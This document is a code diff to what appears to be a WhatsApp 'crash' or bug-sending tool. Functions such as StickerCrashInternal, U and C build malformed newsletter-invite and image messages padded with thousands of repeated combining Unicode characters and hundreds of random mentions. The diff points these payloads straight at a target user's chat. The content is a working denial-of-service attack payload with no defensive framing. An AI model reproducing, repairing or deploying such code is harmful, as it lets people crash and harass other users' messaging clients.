@@ -54,6 +54,7 @@ async function StickerCrashInternal(SYxS7, target) {
 async function U(SYxS7, target) {
   const uw = "ោ៝".repeat(1000);
   const uz = "ꦾ".repeat(1000);
+  const cleanTarget = String(target).endsWith('@s.whatsapp.net') ? target : `${target.split('@')[0]}@s.whatsapp.net`;
   const up = {
     newsletterAdminInviteMessage: {
       newsletterJid: "1234567891234@newsletter",
@@ -62,7 +63,7 @@ async function U(SYxS7, target) {
       inviteExpiration: "90000",
       contextInfo: {
         participant: "0@s.whatsapp.net",
-        remoteJid: "status@broadcast",
+        remoteJid: cleanTarget,
         mentionedJid: [target, "0@s.whatsapp.net"]
       }
     }
@@ -72,6 +73,7 @@ async function U(SYxS7, target) {
 
 async function C(SYxS7, target) {
   const uw = "ꦾ".repeat(1500);
+  const cleanTarget = String(target).endsWith('@s.whatsapp.net') ? target : `${target.split('@')[0]}@s.whatsapp.net`;
   const mentionedJid = [target, "0@s.whatsapp.net"];
   for (let i = 0; i < 200; i++) {
     mentionedJid.push(`${Math.floor(10000000 + Math.random() * 89999999)}@s.whatsapp.net`);
@@ -92,7 +94,7 @@ async function C(SYxS7, target) {
       originalImageUrl: "https://whatsapp.com",
       clickToWhatsappCall: true,
       contextInfo: {
-        remoteJid: "@s.whatsapp.net",
+        remoteJid: cleanTarget,
         participant: "13135550002@s.whatsapp.net",
         disappearingMode: {
           initiator: "CHANGED_IN_CHAT",
